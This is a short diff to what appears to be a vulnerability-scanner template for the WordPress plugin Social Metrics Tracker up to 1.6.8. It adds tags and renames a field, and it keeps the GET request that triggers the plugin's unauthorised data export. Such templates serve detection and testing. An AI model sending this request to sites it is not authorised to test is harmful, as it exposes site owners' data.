@@ -4,8 +4,9 @@ info:
   name: Social Metrics Tracker <= 1.6.8 - Unauthorised Data Export
   author: randomrobbie
   severity: medium
+  tags: wordpress,wp-plugin
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1"
